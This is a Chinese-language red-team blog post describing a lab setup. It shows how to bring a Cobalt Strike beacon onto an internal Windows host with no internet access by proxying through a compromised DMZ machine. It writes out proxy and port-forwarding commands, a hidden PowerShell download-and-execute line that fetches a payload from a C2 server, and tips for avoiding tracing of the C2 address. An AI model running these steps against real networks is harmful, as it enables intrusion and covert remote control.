# 0x01 前言


![title](https://leanote.com/api/file/getImage?fileId=5ec07ab3ab6441613000ad54)


本文就是对这个问题的回答。要达成的效果是：**通过一个马直接让内网机器上线（走内网中可出网机器的代理）。**

但是当我答应我的狗朋友帮忙测试的时候，我也没想到我能因为这个功能踩那么多坑。


# 0x02 实验环境

![title](https://leanote.com/api/file/getImage?fileId=5ec07d4aab64415f3500b332)


注：`DMZ` 和 `internal` 的操作系统都是 Windows 2008 R2。


- `DMZ` 出网，已上线 CS。
![title](https://leanote.com/api/file/getImage?fileId=5ebfbd6fab64411e3003e581)


- `internal` 不出网，只跟 `DMZ` 内网通。
![title](https://leanote.com/api/file/getImage?fileId=5ebfbf6bab64411c3303e624)
>注：我是通过限制安全组的方式来模拟不出网环境的。
internal 的安全组：
![title](https://leanote.com/api/file/getImage?fileId=5ec07e45ab6441613000b537)
![title](https://leanote.com/api/file/getImage?fileId=5ec07e6bab6441613000b574)
- 两台机器之间走内网互通，走外网不通。
![title](https://leanote.com/api/file/getImage?fileId=5ebfbef9ab64411e3003e591)<br/>
![title](https://leanote.com/api/file/getImage?fileId=5ebfbf3cab64411e3003e593)<br/>
![title](https://leanote.com/api/file/getImage?fileId=5ec080ccab6441613000ba56)



# 0x03 思路与操作

### 上线思路

![title](https://leanote.com/api/file/getImage?fileId=5ec08301ab6441613000be7c)


最终上线路径为：

`172.17.30.206`  → `172.17.30.205:80`（HTTP代理）→ `123.57.227.115:8080`（端口转发）→ `47.110.145.157`（HTTP 协议监听器上线）

### 操作步骤




1、dmz 机器上线，方式：Scripted Web Delivery powershell 脚本（此 DMZ 机器是 2008 r2）

![title](https://leanote.com/api/file/getImage?fileId=5ebf1982ab64411c3302714f)





2、dmz 机器架设 HTTP 代理


注：为什么这里是 HTTP 代理而不是 socks5 代理，因为记忆中 Cobalt Strike 只支持 socks4a（未确认）。

>在下常用的一些代理搭建项目：
<br/>
>|项目    |  代理类型 | 备注| 参考  |
| :--:|:--: | :--:| :--: |
| tinyproxy| HTTP |  依赖 docker 环境快速部署  |[快速搭建 HTTP 代理](http://blog.leanote.com/post/snowming/832db0f4cdff)|
|tor    |   socks  | 匿名性好，速度慢|[快速搭建 HTTP 代理](http://blog.leanote.com/post/snowming/832db0f4cdff)|
| esocks  |    socks5 | 快速部署依赖 Java 环境  |[快速搭建 HTTP 代理](http://blog.leanote.com/post/snowming/832db0f4cdff)|
|goproxy|HTTP(S),SOCKS5,WEBSOCKET, TCP, UDP |编译好的单文件不依赖任何环境|[goproxy](https://github.com/snail007/goproxy/releases)|

在这里我用的是 goproxy 在这个 win 2008 r2 上架设 socks 5 代理，毕竟绿色软件，单 exe 即可。


- proxy-windows-386.tar.gz


```
shell C:\Users\Administrator\Desktop\proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
```
注：一定要加 `--daemon`，不然 beacon shell 里面会被消息疯狂刷过去。


本地测试：

![title](https://leanote.com/api/file/getImage?fileId=5ec084f7ab64415f3500c2c4)

代理架设成功了。


3、 在 dmz 机器上开启端口转发


```
shell netsh interface portproxy add v4tov4 listenaddress=172.17.30.205 listenport=80 connectaddress=123.57.227.115 connectport=8080
```


![title](https://leanote.com/api/file/getImage?fileId=5ec08558ab64415f3500c399)

这样就把 `172.17.30.205:80` 转发到了 `123.57.227.115:8080`（HTTP Proxy）。

>注：

>- 查看转发
netsh interface portproxy show v4tov4
- 取消上面配置的端口转发：
netsh interface portproxy delete v4tov4 listenaddress=172.17.30.205 listenport=80
<br/>

>另外 **CS 也有自带的端口转发：**
Beacon Shell 内置的端口转发命令 `rportfwd`，把本机的某个端口转到公网或者内网指定机器的某个端口上。实际用的时候速度确实比较慢，而且经常断......（不过 netsh 也经常断）
rportfwd 389 192.168.1.181 3389
rportfwd stop 389

>![title](https://leanote.com/api/file/getImage?fileId=5ec0cca9ab644161300169af)<br/>
![title](https://leanote.com/api/file/getImage?fileId=5ec0ccb4ab644161300169c8)
这一段参考自：[cobalt strike 快速上手[一]](https://klionsec.github.io/2017/09/23/cobalt-strike/#menu)，Klion 的博客，Klion，2017年9月23日


4、生成挂代理的监听器


![title](https://leanote.com/api/file/getImage?fileId=5ec08640ab6441613000c55b)



然后就是用此监听器生成马，让 internal 机器上线。因为 internal 机器无法出网，我主要是把马传到 DMZ 机器上的共享文件夹，然后 internal 机器走 UNC 路径去执行马。



# 0x04 一个大坑的解决

我生成了两种 payload，`Powershell Command` 和如下图的 `Windows Executalbe`。

![title](https://leanote.com/api/file/getImage?fileId=5ec087cdab64415f3500c8a0)


但是这两种 payload 执行之后，internal 机器都没有上线！

于是去 internal 机器上抓包看了下：

![title](https://leanote.com/api/file/getImage?fileId=5ec0882fab64415f3500c96e)

发现走代理失败？都不是 HTTP Proxy 流量，都是 `172.17.30.206` 这个 internal 机器去直连 `47.110.145.157` 这个 CS Teamserver 的。

分析原因，应该是 `stager` 的问题，因为小体积一般就是 shellcode 加载器，像域前置技术那样，因为 stager 加载不到配置文件里的全部设定，所以第一次请求还是使用真实域名，反射加载完整的beacon才能用上全部的设定。

>注：stager 其实是一段很简单的加载器。应该是 socketedi 协议请求一段 shellcode，加载到内存里，功能单一，这个地方可能没考虑到中间代理的问题。
stager 就做了一件事情，就是请求一个 IP 端口，然后控制端发送一段数据，前4个字节是 shellcode 长度，后面是 shellcode，然后收到数据后，跳转到 shellcode 开始运行。而 stageless 会把几个分阶段的 shellcode 以及 Reflect 的 dll 合并到一个文件里。<br/>
参考：[metasploit payload运行原理浅析(sockedi调用约定是什么)](https://www.cnblogs.com/Akkuman/p/12859091.html)，博客园，Akkuman，2020年5月9日


如下图可以看到分阶段的 payload （stager）的体积明显小于 stageless 的 payload。 

![title](https://leanote.com/api/file/getImage?fileId=5ec089e0ab6441613000cd5f)


于是换 stageless 的 payload 进行测试：

![title](https://leanote.com/api/file/getImage?fileId=5ec08abaab6441613000cf53)


分分钟上线了，喜提 beacon。

![title](https://leanote.com/api/file/getImage?fileId=5ec08b40ab6441613000d089)

注意这里的公网 IP 是 HTTP PROXY 服务器的公网 IP，不过本身这个 internal 机器根本没有公网 IP。


看看流量：

![title](https://leanote.com/api/file/getImage?fileId=5ec08c21ab64415f3500d2e4)

![title](https://leanote.com/api/file/getImage?fileId=5ec08d80ab64415f3500d61a)

的确是走了 HTTP Proxy 去请求与 teamserver 的连接。


>注：中间我尝试过改 listener 中的 stager 地址，但是改成下面两种（HTTP PROXY的公网和内网地址）生成的马都上线失败了，可以理解，毕竟我如果这样指定，我也没指定 HTTP PROXY 的端口，那么也无法走 HTTP PROXY。
![title](https://leanote.com/api/file/getImage?fileId=5ec08de0ab64415f3500d704)
![title](https://leanote.com/api/file/getImage?fileId=5ec08df8ab64415f3500d741)
只是让我意外的一点是，原来 POWERSHELL COMMAND 这种 poayload 也相当于 stager，我以前一直以为这种 payload 是 stageless 的。


# 0x05 总结

- Cobalt Strike 生成「挂代理的马」，是通过指定挂代理的监听器来实现的。
- 代理有 socks 和 http 两种选项，socks 是否支持 socks5 代理我还没测试。
- 不出网的机器可以通过端口转发的方式使用代理服务器的 proxy。
- 在生成马的时候，最好生成 Stageless 的马，因为 `stager` 的问题这种小体积的 payload 一般就是 shellcode 加载器，像域前置技术那样，stager 可能加载不到配置文件里的全部设定，所以第一次请求还是使用真实域名，反射加载完整的beacon才能用上全部的设定。这样可能导致流量并未经由 PROXY 而去直接请求团队服务器，由于机器不出网等问题当然会导致失败。
- CS 的 Stageless payload 当机器不出网（无法直接连接到 teamserver）会默认去获取系统的代理（也就是 IE 里面设置的）。代理出网有 3 种模式：1、默认获取系统代理；2、指定代理；3、坚决不使用代理。如下图，就是指定「坚决不使用代理」：

![title](https://leanote.com/api/file/getImage?fileId=5ec09bbdab6441613000f791)

>注：此图出处为 [CobaltStrike 4.0用户手册_中文翻译](https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf) 4.5 HTTP Beacon 和 HTTPS Beacon -- 手动的 HTTP 代理设置

感谢 `@N0thing`、`@EazyLov3`、`@B0y1n4o4`、`fa11ing1eaf`、`L.N.` 等大佬的指点。







-------------------------

**2020/6/12 日更新：**

**感谢 @undefined 师傅教我。**





<u>内网机器使用 CS 【反向】stager （分阶段）方式上线方案：</u>

【场景】

内网机器A，已控机器DMZ。机器A不出网，但是通DMZ。目标是上线机器A，获取Beacon Shell。


![title](https://leanote.com/api/file/getImage?fileId=5ee32865ab64416aa70016a0)



【步骤】

- 1、 创建 CS 的 listener，只有 proxy 跟普通 listener 不一样。Proxy 填写 `socks://DMZ:1080`。
- 2、DMZ 上开启 socks4a 代理：`gost -L socks4a://:1080` 
> 在这里使用项目：https://docs.ginuerzh.xyz/gost/socks/
>Q：Beacon 是否支持 socks5？
>Todo1：其他项目 [Stowaway](https://www.chainnews.com/articles/645298684184.htm)
Todo2：最近推上有个大佬将一个go的隧道工具用C#重新封装，可以完美实现execute-assembly，<u>不落地</u>实现各种正反向socks5代理，http代理，端口转发等等。但是这个项目我还没找到。
- 3、DMZ 上：ew 监听80，转发到 CS teamserver 监听器上线端口。
- 4、因为我这里使用的是域名上线。首先目标机绑定域名到 DMZ（为了可以执行 stager 的 payload）。
>注：因为本文中已经介绍过：使用 stager 这种分阶段的 playload 的话，实际效果虽然已经在监听器中设置了 proxy，但其实第一次上线不会使用设置的 proxy 代理。所以要<u>手动地</u>把域名第一次指向 DMZ 机器，然后配合 ew 端口转发到 C2（当然第二次就会指向真实IP了）。这里的具体操作的话，因为 DNS 解析是走 UDP，socks4a 支持 TCP，所以域名解析只能在目标机器本地解析，而目标机器没网，所以要改 HOSTS 文件，使得第一次把上线域名指向 DMZ。而配合 ew 端口转发，是为了 stager payload 可用。但是这时候会解析不生效，因为有 DNS 缓存。所以效果会造成上线的 Beacon shell 除了心跳之外没回显。所以解决办法就是通过 `ipconfig /flushdns` 命令清理 DNS 缓存或者是退掉这个上线的 Beacon，spawn 一个新的 Beacon 出来，这样造成 DNS 缓存更新。然后此时就可以把 ew 关掉了，因为现在的流量就是：`目标内网机器` → `DMZ socks4a 代理` → `teamserver 服务器`。

- 5、目标机执行 powershell 上线命令（在当前环境选择了 powershell+合法证书的绕 AV 上线方式）：

```
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('https://C2域名:80/a'))"
```
- 6、别忘记在 DMZ 机器上 kill 掉 ew，因为 socks 已经部署好，以后走 socks，再无需这个端口转发了。避免因为此进程被溯源 C2 真实 IP。

![title](https://leanote.com/api/file/getImage?fileId=5ee36f0aab64416aa7001960)


-------------------------

# 参考文档：

1. [metasploit payload运行原理浅析(sockedi调用约定是什么)](https://www.cnblogs.com/Akkuman/p/12859091.html)，博客园，Akkuman，2020年5月9日
2. [CobaltStrike4.0用户手册_中文翻译](https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf)，QAX-A TEAM
3. [cobalt strike 快速上手[一]](https://klionsec.github.io/2017/09/23/cobalt-strike/#menu)，Klion 的博客，Klion，2017年9月23日



